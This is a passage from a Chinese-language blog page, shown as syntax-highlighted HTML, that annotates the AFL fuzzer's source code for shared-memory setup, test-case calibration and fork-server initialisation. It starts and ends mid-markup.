class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_shm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* shm_str;<br><br>  <span class="hljs-keyword">if</span> (!in_bitmap) <span class="hljs-built_in">memset</span>(virgin_bits, <span class="hljs-number">255</span>, MAP_SIZE);<br><br>  <span class="hljs-built_in">memset</span>(virgin_tmout, <span class="hljs-number">255</span>, MAP_SIZE);<span class="hljs-comment">//记录所有程序超时</span><br>  <span class="hljs-built_in">memset</span>(virgin_crash, <span class="hljs-number">255</span>, MAP_SIZE);<span class="hljs-comment">//记录所有程序崩溃</span><br><br>  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0600</span>);<br><br>  <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;shmget() failed&quot;</span>);<br><br>  atexit(remove_shm);<br><br>  shm_str = alloc_printf(<span class="hljs-string">&quot;%d&quot;</span>, shm_id);<br><br>  <span class="hljs-comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span><br><span class="hljs-comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span><br><span class="hljs-comment">     fork server commands. This should be replaced with better auto-detection</span><br><span class="hljs-comment">     later on, perhaps? */</span><br><br>  <span class="hljs-keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="hljs-number">1</span>);<br><br>  ck_free(shm_str);<br><br>  trace_bits = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">if</span> (!trace_bits) PFATAL(<span class="hljs-string">&quot;shmat() failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其中：<code>shmat</code>方法用于追踪当前的tuple信息，<code>trace_bits</code>位于共享内存上，用于传送信息。</p><p><strong>第一遍fuzz</strong></p><p><strong>calibrate_case函数</strong><br>是AFL的一个关键函数，用于新测试用例的校准，希望能早期发现有问题的测试用例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 <span class="hljs-title function_">calibrate_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* use_mem,</span><br><span class="hljs-params">                         u32 handicap, u8 from_queue)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 first_trace[MAP_SIZE];<br><br>  u8  fault = <span class="hljs-number">0</span>, new_bits = <span class="hljs-number">0</span>, var_detected = <span class="hljs-number">0</span>,<br>      first_run = (q-&gt;exec_cksum == <span class="hljs-number">0</span>);<br><br>  u64 start_us, stop_us;<br><br>  s32 old_sc = stage_cur, old_sm = stage_max;<br>  u32 use_tmout = exec_tmout;<br>  u8* old_sn = stage_name;<br><br>  <span class="hljs-comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="hljs-comment">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="hljs-comment">     to intermittent latency. */</span><br><br>  <span class="hljs-keyword">if</span> (!from_queue || resuming_fuzz)<br>    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,<br>                    exec_tmout * CAL_TMOUT_PERC / <span class="hljs-number">100</span>);<br><br>  q-&gt;cal_failed++;<br><br>  stage_name = <span class="hljs-string">&quot;calibration&quot;</span>;<br>  stage_max  = fast_cal ? <span class="hljs-number">3</span> : CAL_CYCLES;<br><br>  <span class="hljs-comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span><br><span class="hljs-comment">     count its spin-up time toward binary calibration. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode != <span class="hljs-number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)<br>    init_forkserver(argv); <span class="hljs-comment">// 初始化启动forkserver</span><br><br>  <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>  start_us = get_cur_time_us();<span class="hljs-comment">// </span><br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<span class="hljs-comment">// 该循环执行3或8次</span><br><br>    u32 cksum;<br><br>    <span class="hljs-keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();<br><br>    write_to_testcase(use_mem, q-&gt;len);<br><br>    fault = run_target(argv, use_tmout);<span class="hljs-comment">//run_target函数通知forkserver可以开始fork</span><br><br>    <span class="hljs-comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span><br><span class="hljs-comment">       we want to bail out quickly. */</span><br><br>    <span class="hljs-keyword">if</span> (stop_soon || fault != crash_mode) <span class="hljs-keyword">goto</span> abort_calibration;<br><br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;<br>      fault = FAULT_NOINST;<br>      <span class="hljs-keyword">goto</span> abort_calibration;<br>    &#125;<br><br>    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<span class="hljs-comment">//计算trace_bits的哈希值</span><br><br>    <span class="hljs-keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;<span class="hljs-comment">//若哈希值不同</span><br><br>      u8 hnb = has_new_bits(virgin_bits);<br>      <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<span class="hljs-comment">//如果hnb＞new_bits，证明该new_bits已经跑过，将新的hnb赋值给new_bits,令其重新开始下一轮循环</span><br><br>      <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) &#123;<span class="hljs-comment">// exec_cksum是循环次数，若不是第一次跑</span><br><br>        u32 i;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAP_SIZE; i++) &#123;<br><br>          <span class="hljs-keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;<br><br>            var_bytes[i] = <span class="hljs-number">1</span>;<br>            stage_max    = CAL_CYCLES_LONG;<br><br>          &#125;<br><br>        &#125;<br><br>        var_detected = <span class="hljs-number">1</span>;<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        q-&gt;exec_cksum = cksum;<br>        <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><br>  stop_us = get_cur_time_us();<br><br>  <br></code></pre></td></tr></table></figure><p><strong>init_forkserver函数</strong><br>该函数实现启动forkserver</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">init_forkserver</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">itimerval</span> <span class="hljs-title">it</span>;</span><br>  <span class="hljs-type">int</span> st_pipe[<span class="hljs-number">2</span>], ctl_pipe[<span class="hljs-number">2</span>];<span class="hljs-comment">//状态通道与控制通道</span><br>  <span class="hljs-type">int</span> status;<br>  s32 rlen;<br><br>  ACTF(<span class="hljs-string">&quot;Spinning up the fork server...&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (pipe(st_pipe) || pipe(ctl_pipe)) PFATAL(<span class="hljs-string">&quot;pipe() failed&quot;</span>);<span class="hljs-comment">//两个管道都建立失败，报错</span><br><br>  forksrv_pid = fork();<br><br>  <span class="hljs-keyword">if</span> (forksrv_pid &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (!forksrv_pid) &#123;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">r</span>;</span><br><br>    <span class="hljs-comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span><br><span class="hljs-comment">       soft 128. Let&#x27;s try to fix that... */</span><br><br>    <span class="hljs-keyword">if</span> (!getrlimit(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="hljs-number">2</span>) &#123;<br><br>      r.rlim_cur = FORKSRV_FD + <span class="hljs-number">2</span>;<br>      setrlimit(RLIMIT_NOFILE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mem_limit) &#123;<br><br>      r.rlim_max = r.rlim_cur = ((<span class="hljs-type">rlim_t</span>)mem_limit) &lt;&lt; <span class="hljs-number">20</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br><br>      setrlimit(RLIMIT_AS, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      <span class="hljs-comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span><br><span class="hljs-comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span><br><span class="hljs-comment">         maps - so we should be getting good protection against OOM bugs. */</span><br><br>      setrlimit(RLIMIT_DATA, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br><br>    &#125;<br><br>    <span class="hljs-comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span><br><span class="hljs-comment">       before the dump is complete. */</span><br><br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br><br>    setrlimit(RLIMIT_CORE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    <span class="hljs-comment">/* Isolate the process and configure standard descriptors. If out_file is</span><br><span class="hljs-comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span><br><br>    setsid();<br><br>    dup2(dev_null_fd, <span class="hljs-number">1</span>);<br>    dup2(dev_null_fd, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">if</span> (out_file) &#123;<br><br>      dup2(dev_null_fd, <span class="hljs-number">0</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      dup2(out_fd, <span class="hljs-number">0</span>);<br>      close(out_fd);<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Set up control and status pipes, close the unneeded original fds. */</span><br><br>    <span class="hljs-keyword">if</span> (dup2(ctl_pipe[<span class="hljs-number">0</span>], FORKSRV_FD) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);<br>    <span class="hljs-keyword">if</span> (dup2(st_pipe[<span class="hljs-number">1</span>], FORKSRV_FD + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);<br><br>    close(ctl_pipe[<span class="hljs-number">0</span>]);<br>    close(ctl_pipe[<span class="hljs-number">1</span>]);<br>    close(st_pipe[<span class="hljs-number">0</span>]);<br>    close(st_pipe[<span class="hljs-number">1</span>]);<br><br>    close(out_dir_fd);<br>    close(dev_null_fd);<br>    close(dev_urandom_fd);<br>    close(fileno(plot_file));<br><br>    <span class="hljs-comment">/* This should improve performance a bit, since it stops the linker from</span><br><span class="hljs-comment">       doing extra work post-fork(). */</span><br><br>    <span class="hljs-keyword">if</span> (!getenv(<span class="hljs-string">&quot;LD_BIND_LAZY&quot;</span>)) setenv(<span class="hljs-string">&quot;LD_BIND_NOW&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* Set sane defaults for ASAN if nothing else specified. */</span><br><br>    setenv(<span class="hljs-string">&quot;ASAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;detect_leaks=0:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span><br><span class="hljs-comment">       point. So, we do this in a very hacky way. */</span><br><br>    setenv(<span class="hljs-string">&quot;MSAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="hljs-string">&quot;:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1:&quot;</span><br>                           <span class="hljs-string">&quot;msan_track_origins=0&quot;</span>, <span class="hljs-number">0</span>);<br><br>    execv(target_path, argv);<br><br>    <span class="hljs-comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span><br><span class="hljs-comment">       falling through. */</span><br><br>    *(u32*)trace_bits = EXEC_FAIL_SIG;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Close the unneeded endpoints. */</span><br><br>  close(ctl_pipe[<span class="hljs-number">0</span>]);<br>  close(st_pipe[<span class="hljs-number">1</span>]);<br><br>  fsrv_ctl_fd = ctl_pipe[<span class="hljs-number">1</span>];<br>  fsrv_st_fd  = st_pipe[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span><br><br>  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="hljs-number">1000</span>);<br>  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  rlen = read(fsrv_st_fd, &amp;status, <span class="hljs-number">4</span>);<br><br>  it.it_value.tv_sec = <span class="hljs-number">0</span>;<br>  it.it_value.tv_usec = <span class="hljs-number">0</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span><br><span class="hljs-comment">     Otherwise, try to figure out what went wrong. */</span><br><br>  <span class="hljs-keyword">if</span> (rlen == <span class="hljs-number">4</span>) &#123;<br>    OKF(<span class="hljs-string">&quot;All right - fork server is up.&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (child_timed_out)<br>    FATAL(<span class="hljs-string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (waitpid(forksrv_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>)<br>    PFATAL(<span class="hljs-string">&quot;waitpid() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br><br>    <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! Since it seems to be built with ASAN and you have a\n&quot;</span><br>           <span class="hljs-string">&quot;    restrictive memory limit configured, this is expected; please read\n&quot;</span><br>           <span class="hljs-string">&quot;    %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing the\n&quot;</span><br>           <span class="hljs-string">&quot;      target to hit an OOM condition in the dynamic linker. Try bumping up\n&quot;</span><br>           <span class="hljs-string">&quot;      the limit with the -m setting in the command line. A simple way confirm\n&quot;</span><br>           <span class="hljs-string">&quot;      this diagnosis would be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>           <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>           <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>           <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>           <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>           DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>    &#125;<br><br>    FATAL(<span class="hljs-string">&quot;Fork server crashed with signal %d&quot;</span>, WTERMSIG(status));<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (*(u32*)trace_bits == EXEC_FAIL_SIG)<br>    FATAL(<span class="hljs-string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>           <span class="hljs-string">&quot;    handshake with the injected code. Since it seems to be built with ASAN and\n&quot;</span><br>           <span class="hljs-string">&quot;    you have a restrictive memory limit configured, this is expected; please\n&quot;</span><br>           <span class="hljs-string">&quot;    read %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. Perhaps there is a horrible bug 